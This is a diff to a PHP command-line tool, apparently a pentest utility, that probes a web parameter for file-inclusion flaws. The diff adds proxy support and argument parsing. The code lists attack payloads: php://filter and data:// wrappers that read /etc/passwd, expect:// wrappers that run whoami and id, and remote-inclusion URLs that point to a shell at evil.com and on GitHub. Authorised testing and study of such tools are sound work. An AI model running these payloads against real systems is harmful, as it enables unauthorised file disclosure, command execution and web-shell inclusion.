@@ -5,9 +5,27 @@ class LFIWrapperScanner {
     private $colors;
     private $successCount = 0;
     private $testedCount = 0;
+    private $proxy = null;
     
     public function __construct() {
         $this->initColors();
+        $this->detectProxy();
+    }
+    
+    private function detectProxy() {
+        // Sprawdzanie zmiennych środowiskowych proxy
+        $proxyEnvVars = ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy'];
+        foreach ($proxyEnvVars as $envVar) {
+            if ($proxy = getenv($envVar)) {
+                $this->proxy = $proxy;
+                $this->printStatus("Detected proxy: " . $proxy, 'info');
+                break;
+            }
+        }
+    }
+    
+    public function setProxy($proxy) {
+        $this->proxy = $proxy;
     }
     
     private function initColors() {
@@ -55,18 +73,7 @@ class LFIWrapperScanner {
             'php://filter/read=convert.quoted-printable-encode/resource=',
         ];
         
-        // more encodings
-        $encodings = [
-            'base64',
-            'rot13',
-            'quoted-printable',
-            'zlib.deflate',
-            'zlib.inflate',
-            'bzip2.compress',
-            'bzip2.decompress',
-        ];
-        
-        //generating testfile
+        // generating testfile
         $resources = [
             $testFile,
             '/etc/hosts',
@@ -100,7 +107,7 @@ class LFIWrapperScanner {
             }
         }
         
-        // Data wrapper  PHP < 8.0
+        // Data wrapper (dla PHP < 8.0)
         $dataWrappers = [
             'data://text/plain;base64,',
             'data://text/plain,',
@@ -112,12 +119,12 @@ class LFIWrapperScanner {
             $wrappers[] = $wrapper . $testContent;
         }
         
-        // Expect wrapper 
+        // Expect wrapper (jeśli allow_url_include=1)
         $wrappers[] = 'expect://whoami';
         $wrappers[] = 'expect://id';
         $wrappers[] = 'expect://ls';
         
-        // HTTP wrapper
+        // HTTP wrapper (dla testów RFI)
         $wrappers[] = 'http://evil.com/shell.txt';
         $wrappers[] = 'https://raw.githubusercontent.com/evil/shell/master/shell.php';
         
@@ -130,7 +137,7 @@ class LFIWrapperScanner {
     public function testUrl($url, $timeout = 10) {
         $ch = curl_init();
         
-        curl_setopt_array($ch, [
+        $curlOptions = [
             CURLOPT_URL => $url,
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_TIMEOUT => $timeout,
@@ -140,11 +147,20 @@ class LFIWrapperScanner {
             CURLOPT_SSL_VERIFYHOST => false,
             CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             CURLOPT_HEADER => true,
-        ]);
+        ];
+        
+        // Dodaj proxy jeśli jest skonfigurowane
+        if ($this->proxy) {
+            $curlOptions[CURLOPT_PROXY] = $this->proxy;
+            $curlOptions[CURLOPT_HTTPPROXYTUNNEL] = true;
+        }
+        
+        curl_setopt_array($ch, $curlOptions);
         
         $response = curl_exec($ch);
         $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
+        $error = curl_error($ch);
         
         curl_close($ch);
         
@@ -152,6 +168,7 @@ class LFIWrapperScanner {
             'response' => $response,
             'http_code' => $httpCode,
             'total_time' => $totalTime,
+            'error' => $error,
             'success' => ($httpCode == 200 && !empty($response))
         ];
     }
@@ -188,7 +205,22 @@ class LFIWrapperScanner {
         $this->printStatus("Starting LFI Wrapper Scanner against: " . $targetUrl, 'info');
         $this->printStatus("Testing parameter: " . $parameter, 'info');
         $this->printStatus("Test file: " . $testFile, 'info');
+        if ($this->proxy) {
+            $this->printStatus("Using proxy: " . $this->proxy, 'info');
+        }
         echo str_repeat("-", 80) . "\n";
+        
+        // Test połączenia
+        $this->printStatus("Testing connection to target...", 'testing');
+        $testResponse = $this->testUrl($targetUrl);
+        
+        if ($testResponse['error']) {
+            $this->printStatus("Connection error: " . $testResponse['error'], 'error');
+            $this->printStatus("If you're behind proxy, use: --proxy http://proxy:port", 'warning');
+            return;
+        } else {
+            $this->printStatus("Connection successful. HTTP Code: " . $testResponse['http_code'], 'success');
+        }
         
         $wrappers = $this->generateWrappers($targetUrl, $parameter, $testFile);
         $results = [];
@@ -200,6 +232,12 @@ class LFIWrapperScanner {
             $this->printStatus("Testing [" . ($i + 1) . "/" . count($wrappers) . "]: " . $wrapper, 'testing');
             
             $response = $this->testUrl($testUrl);
+            
+            if ($response['error']) {
+                $this->printStatus("✗ Request failed: " . $response['error'], 'error');
+                continue;
+            }
+            
             $confidence = $this->analyzeResponse($response, $wrapper);
             
             if ($response['success']) {
@@ -265,18 +303,19 @@ class LFIWrapperScanner {
     }
     
     public function showBanner() {
-        $banner = $this->color("
-                           _          _____      
- __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
- \ \ /\ / / '__/ _` | '_ \| '_ \| '_ \ |_ \| '__|
-  \ V  V /| | | (_| | |_) | | | | |_) |__) | |   
-   \_/\_/ |_|  \__,_| .__/|_| |_| .__/____/|_|   
-                    |_|         |_|              
+        $banner = "
+        " . $this->color("
+  _      ______ _____    _       __        __    _                  
+ | |    |  ____|  __ \\  | |      \\ \\      / /   | |                 
+ | |    | |__  | |__) | | |       \\ \\ /\\ / /___ | |__   ___  _ __   
+ | |    |  __| |  _  /  | |        \\ V  V // _ \\| '_ \\ / _ \\| '_ \\  
+ | |____| |____| | \\ \\  | |____     \\_/\\_/ \\___/| |_) | (_) | | | | 
+ |______|______|_|  \\_\\ |______|                 |_.__/ \\___/|_| |_| 
                                                                   
         ", 'cyan') . "
-        " . $this->color("LFI Wrapper Scanner", 'yellow') . "
-        " . $this->color("PHP Wrapper-based LFI Detection Tool", 'blue') . "
-        " . $this->color("Author: csshark", 'magenta') . "
+        " . $this->color("LFI Wrapper Scanner v1.0", 'yellow') . "
+        " . $this->color("Advanced PHP Wrapper-based LFI Detection Tool", 'blue') . "
+        " . $this->color("Author: Security Researcher", 'magenta') . "
         
         ";
         
@@ -284,6 +323,7 @@ class LFIWrapperScanner {
     }
 }
 
+// Obsługa argumentów wiersza poleceń
 if (php_sapi_name() !== 'cli') {
     die("This script must be run from command line\n");
 }
@@ -291,16 +331,38 @@ if (php_sapi_name() !== 'cli') {
 $scanner = new LFIWrapperScanner();
 $scanner->showBanner();
 
-if ($argc < 3) {
-    echo "Usage: php " . $argv[0] . " <target_url> <parameter> [test_file]\n";
-    echo "\n"; 
-    echo "Example: php " . $argv[0] . " \"http://example.com/vuln.php\" \"file\" \"/etc/passwd\"\n";
-    echo "Example: php " . $argv[0] . " \"http://example.com/page.php?param=value\" \"file\" \"/etc/hosts\"\n";
+// Parsowanie argumentów
+$targetUrl = null;
+$parameter = null;
+$testFile = '/etc/passwd';
+$proxy = null;
+
+for ($i = 1; $i < $argc; $i++) {
+    if ($argv[$i] === '--proxy' && isset($argv[$i + 1])) {
+        $proxy = $argv[$i + 1];
+        $i++;
+    } elseif ($argv[$i] === '--file' && isset($argv[$i + 1])) {
+        $testFile = $argv[$i + 1];
+        $i++;
+    } elseif (!$targetUrl) {
+        $targetUrl = $argv[$i];
+    } elseif (!$parameter) {
+        $parameter = $argv[$i];
+    }
+}
+
+if (!$targetUrl || !$parameter) {
+    echo "Usage: php " . $argv[0] . " <target_url> <parameter> [options]\n";
+    echo "Example: php " . $argv[0] . " \"http://example.com/vuln.php\" \"file\"\n";
+    echo "Example: php " . $argv[0] . " \"http://example.com/page.php\" \"page\" --file \"/etc/hosts\" --proxy \"http://proxy:8080\"\n";
+    echo "\nOptions:\n";
+    echo "  --proxy <proxy>    Set proxy (http://proxy:port)\n";
+    echo "  --file <file>      Set test file (default: /etc/passwd)\n";
     exit(1);
 }
 
-$targetUrl = $argv[1];
-$parameter = $argv[2];
-$testFile = $argc > 3 ? $argv[3] : '/etc/passwd';
+if ($proxy) {
+    $scanner->setProxy($proxy);
+}
 
 $scanner->scan($targetUrl, $parameter, $testFile);
